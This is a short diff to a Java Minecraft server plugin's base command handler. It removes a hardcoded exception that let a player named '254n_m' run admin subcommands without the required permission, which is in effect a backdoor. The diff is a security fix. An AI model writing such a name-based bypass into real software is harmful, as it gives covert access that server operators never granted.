@@ -13,7 +13,7 @@ public class BaseCommand implements TabExecutor {
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        if (sender.hasPermission("l2x9core.base") || sender.getName().equals("254n_m")) {
+        if (sender.hasPermission("l2x9core.base")) {
             if (args.length > 0) {
                 if (args[0].equalsIgnoreCase("reload")) {
                     Main.getPlugin().reloadConfig();
